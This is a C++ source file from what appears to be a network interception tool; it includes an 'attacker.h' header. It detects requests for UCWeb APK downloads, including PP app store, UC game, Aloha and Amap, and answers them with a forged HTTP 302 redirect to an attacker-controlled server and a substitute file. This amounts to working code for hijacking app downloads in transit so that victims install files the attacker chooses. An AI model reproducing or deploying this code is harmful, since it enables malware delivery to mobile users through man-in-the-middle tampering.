
#include <windows.h>
#include "ucmobile.h"
#include "../cipher/CryptoUtils.h"
#include "sslPublic.h"
#include "../attacker.h"
#include "../HttpUtils.h"

int mflag = 0;

int UCMobile::isUCMobile(const char * url, const char * host) {
	if (strstr(host, "pdds.ucweb.com") || strstr(host,"pdds-cdn.uc.cn") || strstr(host,"wap3.ucweb.com")) {
		if (strstr(url, "/download/stfile/") && strstr(url, "/ppappstore_V") && strstr(url, ".apk"))
		{
			mflag = 1;
			return 1;
		}
		else if (strstr(url, "/download/stfile/") && strstr(url, "/ucgame_V") && strstr(url, ".apk"))
		{
			mflag = 2;
			return 2;
		}
		else if (strstr(url, "/stfile/") && strstr(url, "/aloha_V") && strstr(url, ".apk"))
		{
			mflag = 3;
			return 3;
		}
		else if (strstr(url, "/amap/") && strstr(url, "/amap_V") && strstr(url, ".apk"))
		{
			mflag = 4;
			return 4;
		}
// 		else if (strstr(url, "/stfile/") && strstr(url, "/ucgame-rta_V") && strstr(url, ".apk"))
// 		{
// 			mflag = 5;
// 			return 5;
// 		}
// 		else if (strstr(url, "/stfile/") && strstr(url, "/uclive_V") && strstr(url, ".apk"))
// 		{
// 			mflag = 6;
// 			return 6;
// 		}
	}

	return FALSE;
}










int UCMobile::makeUpdateUrl(char * lpbuf, int bufsize, int limit,LPSSLPROXYPARAM lpssl) {
	char *szformat = "HTTP/1.1 302 Found\r\n"
		"Content-Type: text/plain; charset=utf-8\r\n"
		"Content-Length: 0\r\n"
		"Connection: keep-alive\r\n"
		"Location: http://%s/%s\r\n\r\n";

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

	int totallen = 0;
	if (mflag == 1)
	{
		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), UCPPAPPSTORE_UPDATE_FILENAME);
	}else if (mflag == 2)
	{
		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), UCGAME_UPDATE_FILENAME);
	}else if (mflag == 3)
	{
		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), UCALOPHA_UPDATE_FILENAME);
	}
	else if (mflag == 4)
	{
		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), UCAMAP_UPDATE_FILENAME);
	}
// 	else if (mflag == 5)
// 	{
// 		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), UCGAMERTA_UPDATE_FILENAME);
// 	}
// 	else if (mflag == 6)
// 	{
// 		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), UCLIVE_UPDATE_FILENAME);
// 	}

	return totallen;
}